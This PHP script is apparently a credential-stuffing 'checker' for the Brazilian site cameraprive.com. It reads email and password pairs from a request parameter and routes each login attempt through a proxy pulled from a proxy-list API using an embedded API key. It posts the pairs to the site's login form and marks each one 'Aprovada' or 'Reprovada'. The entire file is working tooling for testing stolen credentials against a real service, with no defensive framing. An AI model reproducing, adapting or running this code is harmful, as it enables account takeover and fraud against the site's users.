<?php


error_reporting(0);


function multiexplode($delimiters, $string) {
	$partida = str_replace($delimiters, $delimiters[0], $string);
	$executar = explode($delimiters[0], $partida);
	return $executar;
}
$lista = $_REQUEST['lista'];
$email = multiexplode(array(";", ":", "|", ">"), $lista)[0];
$senha = multiexplode(array(";", ":", "|", ">"), $lista)[1];


function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

$link = file_get_contents("https://api.getproxylist.com/proxy?apiKey=2769d07972701a1cb65b10f9565e205f3fcd463a&protocol=socks4&lastTested=600");
$link2 = json_decode($link);
$link3 = $link2 ->ip;
$link4 = $link2 ->port;
$proxy = $link3.":".$link4;

$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://cameraprive.com/br/login');
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: cameraprive.com',
'content-type: application/x-www-form-urlencoded',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ci_csrf_token=353ec55aadef5d0f9d186cfabbd72f84&d08b91e1ddeb753e0327e93513147914='.$email.'&d2540f988a8c4180bf25e78067b3b9e1='.$senha.'&model=&referer=&account=&stamp=1549402425&type=user');
$end = curl_exec($ch);


if(strpos($end, 'sua caixa de') !== false) {
 echo "<b><i><font style='color: green;'> #Aprovada &nbsp;&nbsp;</font></i>$email|$senha | VERIFICAÇÃO: SIM  <font style='color: MidnightBlue;'>#Painelcheckers</font></b>";
} else {
 echo "<font style='color: red;'> #Reprovada </font>$email|$senha <font style='color: DeepSkyBlue;'>#Painelcheckers</font>";
}


?>
